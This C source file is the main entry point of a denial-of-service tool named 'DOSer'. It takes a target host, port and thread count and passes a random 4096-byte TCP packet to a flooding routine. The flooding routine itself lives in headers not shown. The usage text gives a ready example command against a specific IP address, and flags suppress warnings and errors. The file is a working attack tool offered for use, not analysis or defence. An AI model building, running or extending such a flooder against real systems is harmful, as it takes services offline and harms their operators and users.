//main.c

#include <stdbool.h>
#include <time.h>
#include <stdint.h>

#include "dos.h"
#include "message.h"
#include "socket.h"

bool socket_wait;

int main(int argc, const char* argv[])
{
    socket_wait = true;
    hide_warnings = false;
    srand(time(NULL));
    if(!checklarg("--hide-logo", argv, argc)){
        printf("█████╗  ╔██████╗ ███████╗███████╗██████╗\n");
        printf("██╔══██╗██╔═══██╗██╔════╝██╔════╝██╔══██╗\n");
        printf("██║  ██║██║   ██║███████╗█████╗  ██████╔╝\n");
        printf("██║  ██║██║   ██║╚════██║██╔══╝  ██╔══██╗\n");
        printf("██████╔╝╚██████╔╝███████║███████╗██║  ██║\n");
        printf(" ╚═════╝  ╚═════╝ ╚══════╝╚══════╝╚═╝  ╚═╝\n");
        printf("                                             v1.0-first-try\n");
    }
    info("DOSer v1.0 by Jimmy(NJUPT IOT)");


    if (argc < 3 || checkarg("-h", argv, argc)) {
        info("Usage:%s  <HOST> <PORT>  -t <THREAD COUNT>  [ --no-warnings --no-wait --no-status --no-errors]", argv[0]);
        info("For example: ./dos 94.191.85.186 80 -t 1000 --no-wait");
        return 0;
    }

    const char* _host = argv[1];  
    char* host = (char*)malloc(sizeof(char) * 14);

    info("Starting up");
    if (hostname2ip(_host, host)) {
        error("Failed to resolve host:%s", _host);

        return -1;
    }

    status=!checklarg("--no-status", argv, argc);

    int port = atoi(argv[2]);
    if (port < 0) {
        error("Bad port supplied!");
        return -1;
    }

    hide_warnings = checklarg("--no-warnings", argv, argc);
    hide_errors = checklarg("--no-errors", argv, argc);

    int THREAD_COUNT = 5;

    size_t PACKET_SIZE = 4096;

    if (checkarg("-t", argv, argc)) {
        const char* raw_threadcount = getarg("-t", argv, argc);
        THREAD_COUNT = atoi(raw_threadcount);

    }

    char* packet = NULL;

    packet = randstring(PACKET_SIZE);

    if (THREAD_COUNT <= 0) {
        error("Bad thread count!");
        return -1;
    }

    int PROTOCOL = MODE_TCP;    //选择的协议
    
    //一个数据包的单位 MB 
    metrics=SIZE_MB;

    hide_warnings = checklarg("--no-warnings", argv, argc);

    socket_wait = !checklarg("--no-wait", argv, argc);

    dos(host, port, packet, THREAD_COUNT, PROTOCOL);

    return 0;
}
